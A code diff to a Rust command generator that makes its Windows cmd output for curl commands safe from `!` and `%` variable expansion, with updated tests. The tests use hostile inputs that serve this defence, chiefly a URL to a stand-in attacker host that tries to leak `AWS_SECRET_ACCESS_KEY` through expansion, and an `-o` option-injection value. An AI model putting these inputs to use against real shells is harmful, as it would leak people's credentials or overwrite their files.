@@ -8,6 +8,11 @@
 //!   file); CR/LF in values are replaced with spaces (no header injection).
 //! - HTTP/2 pseudo-headers and `Content-Length` are left to curl.
 //! - NUL cannot be passed in any argument and is dropped.
+//! - cmd: no `!` reaches the command line, so delayed expansion (`/V:ON`)
+//!   has nothing to expand: the URL's `!` is percent-encoded (`%21`), and a
+//!   header, method or body containing `!` is left out ([`Command::left_out`]).
+//!   Every `%` that something follows is written `^%^`, so whatever name
+//!   cmd reads between two `%` starts with `^` and is never a variable.
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 pub(crate) enum Dialect {
@@ -77,12 +82,63 @@ fn method(request: &Request) -> Option<&str> {
     (token(method) && !method.eq_ignore_ascii_case(implied)).then_some(method)
 }
 
-pub(crate) fn command(request: &Request, shell: Dialect) -> String {
+/// A command, and whether a part of the request had to be left out.
+#[derive(Clone, Debug, PartialEq)]
+pub(crate) struct Command {
+    pub text: String,
+    /// cmd only: headers, a method or a body containing `!`.
+    pub left_out: bool,
+}
+
+pub(crate) fn command(request: &Request, shell: Dialect) -> Command {
     match shell {
-        Dialect::Bash => posix_like(request, bash, " \\\n  "),
-        Dialect::Cmd => posix_like(request, cmd, " ^\n  "),
-        Dialect::PowerShell => powershell(request),
+        Dialect::Bash => Command {
+            text: posix_like(request, bash, " \\\n  "),
+            left_out: false,
+        },
+        Dialect::Cmd => {
+            let (safe, left_out) = without_bang(request);
+            Command {
+                text: posix_like(&safe, cmd, " ^\n  "),
+                left_out,
+            }
+        }
+        Dialect::PowerShell => Command {
+            text: powershell(request),
+            left_out: false,
+        },
     }
+}
+
+/// The request with no `!` anywhere: delayed expansion is then harmless.
+fn without_bang(request: &Request) -> (Request, bool) {
+    let mut left_out = false;
+    let mut safe = Request {
+        url: request.url.replace('!', "%21"),
+        body_omitted: request.body_omitted,
+        ..Default::default()
+    };
+    safe.method = if request.method.contains('!') {
+        left_out = true;
+        String::new()
+    } else {
+        request.method.clone()
+    };
+    for (name, value) in &request.headers {
+        if name.contains('!') || value.contains('!') {
+            left_out = true;
+        } else {
+            safe.headers.push((name.clone(), value.clone()));
+        }
+    }
+    safe.body = match &request.body {
+        Some(body) if body.contains('!') => {
+            left_out = true;
+            None
+        }
+        body => body.clone(),
+    };
+    (safe, left_out)
 }
 
 fn posix_like(request: &Request, quote: fn(&str) -> String, newline: &str) -> String {
@@ -139,10 +195,9 @@ pub(crate) fn cmd(value: &str) -> String {
             '\n' => out.push_str("^\n\n"),
             '%' => {
                 out.push_str("^%");
-                if chars
-                    .peek()
-                    .is_some_and(|n| n.is_ascii_alphanumeric() || *n == '_')
-                {
+                // A caret after every `%` that something follows: any
+                // `%name%` cmd could read then starts with `^`.
+                if chars.peek().is_some() {
                     out.push('^');
                 }
             }
@@ -260,7 +315,7 @@ mod tests {
             );
         }
         // The whole command parses into exactly the intended argv.
-        let command = command(&request(HOSTILE[1]), Dialect::Bash);
+        let command = command(&request(HOSTILE[1]), Dialect::Bash).text;
         let script = format!(
             "set -- {}; printf '%s\\0' \"$@\"",
             &command["curl ".len()..]
@@ -295,13 +350,13 @@ mod tests {
     #[test]
     fn unsafe_headers_and_options_never_reach_curl() {
         for shell in Dialect::ALL {
-            let text = command(&request("-o /tmp/x"), shell);
+            let text = command(&request("-o /tmp/x"), shell).text;
             assert!(!text.contains("authority"), "{shell:?}: pseudo-header");
             assert!(!text.contains("passwd"), "{shell:?}: @file header");
             assert!(!text.contains("Content-Length"), "{shell:?}");
             assert!(!text.contains("\nEvil"), "{shell:?}: header injection");
         }
-        let bash = command(&request("-o /tmp/x"), Dialect::Bash);
+        let bash = command(&request("-o /tmp/x"), Dialect::Bash).text;
         assert!(bash.starts_with("curl --url 'https://e.test/?q=-o /tmp/x'"));
     }
 
@@ -316,6 +371,8 @@ mod tests {
         assert_eq!(cmd("50%"), "^\"50^%^\"");
         assert_eq!(cmd("%PATH%"), "^\"^%^PATH^%^\"");
         assert_eq!(cmd("a&b|c<d>e^f!g"), "^\"a^&b^|c^<d^>e^^f^!g^\"");
+        assert_eq!(cmd("%%x"), "^\"^%^^%^x^\"");
+        assert_eq!(cmd("%-x%"), "^\"^%^-x^%^\"");
         assert_eq!(cmd("a\r\nb"), "^\"a^\n\nb^\"");
         for value in HOSTILE {
             let quoted = cmd(value);
@@ -335,7 +392,7 @@ mod tests {
     fn powershell_strings_are_literal() {
         assert_eq!(powershell_quote("it's $x `n"), "'it''s $x `n'");
         assert_eq!(powershell_quote("‘a’"), "'‘‘a’’'");
-        let text = command(&request("it's"), Dialect::PowerShell);
+        let text = command(&request("it's"), Dialect::PowerShell).text;
         assert!(text.starts_with(
             "Invoke-WebRequest -UseBasicParsing -Uri 'https://e.test/?q=it''s' -Method 'PUT'"
         ));
@@ -362,12 +419,47 @@ mod tests {
             url: "https://e.test/".into(),
             ..Default::default()
         };
-        assert_eq!(command(&get, Dialect::Bash), "curl --url 'https://e.test/'");
+        assert_eq!(
+            command(&get, Dialect::Bash).text,
+            "curl --url 'https://e.test/'"
+        );
         get.method = "POST".into();
         get.body = Some("x".into());
         assert_eq!(
-            command(&get, Dialect::Bash),
+            command(&get, Dialect::Bash).text,
             "curl --url 'https://e.test/' \\\n  --data-raw 'x'"
         );
+    }
+
+    /// Review of PR 2904 (P1-1): cmd output holds no `!` in any state of
+    /// delayed expansion, and every `%name%` cmd could read starts with `^`.
+    #[test]
+    fn review2904_cmd_is_safe_with_delayed_expansion_on_and_off() {
+        let request = Request {
+            method: "POST".into(),
+            url: "https://attacker.invalid/?key=!AWS_SECRET_ACCESS_KEY!&p=%PATH%".into(),
+            headers: vec![
+                ("x-ok".into(), "100%".into()),
+                ("x-bang".into(), "hi!".into()),
+            ],
+            body: Some("pass!word".into()),
+            body_omitted: false,
+        };
+        let command = command(&request, Dialect::Cmd);
+        assert!(!command.text.contains('!'), "{}", command.text);
+        assert!(command.left_out, "the header and body with ! are left out");
+        assert!(command.text.contains("key=^%^21AWS_SECRET_ACCESS_KEY^%^21"));
+        assert!(!command.text.contains("hi"));
+        assert!(!command.text.contains("pass"));
+        // Phase-1 % expansion: between any two % the name starts with ^.
+        let text = &command.text;
+        let percents: Vec<usize> = text.match_indices('%').map(|(i, _)| i).collect();
+        for pair in percents.windows(2) {
+            let name = &text[pair[0] + 1..pair[1]];
+            assert!(name.starts_with('^'), "%{name}% could expand in {text}");
+        }
+        // Control: bash keeps everything.
+        let bash = super::command(&request, Dialect::Bash);
+        assert!(bash.text.contains("!AWS_SECRET_ACCESS_KEY!") && !bash.left_out);
     }
 }
